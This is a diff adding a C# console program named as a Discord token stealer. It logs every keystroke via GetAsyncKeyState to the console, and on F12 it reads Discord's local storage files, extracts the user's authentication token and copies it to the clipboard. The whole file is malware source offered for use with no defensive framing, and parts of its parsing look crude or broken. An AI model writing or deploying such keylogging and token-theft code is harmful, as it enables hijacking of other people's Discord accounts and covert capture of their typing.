@@ -1,0 +1,57 @@
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.Threading; 
+
+namespace Discord_Token_Stealer
+{
+    class Program
+    {
+        [DllImport("user32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i); 
+
+        static void Main(string[] args)
+        {
+            while (true)
+            {
+                Thread.Sleep(10);
+                for (Int32 i = 0; i < 255; i++)
+                {
+                    int keyState = GetAsyncKeyState(i);
+                    if (keyState == 1 || keyState == -32767)
+                    {
+                        Console.WriteLine((Keys)i);
+                        if ((Keys)i == Keys.F12)
+                        {
+                            Process[] processes = Process.GetProcessesByName("Discord");
+                            if (processes.Length > 0)
+                            {
+                                Process process = processes[0];
+                                string path = process.MainModule.FileName;
+                                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+                                string discordPath = localAppData + @"\Discord\Local Storage\leveldb";
+                                string[] files = System.IO.Directory.GetFiles(discordPath);
+                                foreach (string file in files)
+                                {
+                                    if (file.Contains("https_discordapp.com_0.localstorage"))
+                                    {
+                                        string token = System.IO.File.ReadAllText(file);
+                                        token = token.Substring(token.IndexOf("token") + 7);
+                                        token = token.Substring(0, token.IndexOf("\""));
+                                        Console.WriteLine(token);
+                                        Clipboard.SetText(token);
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
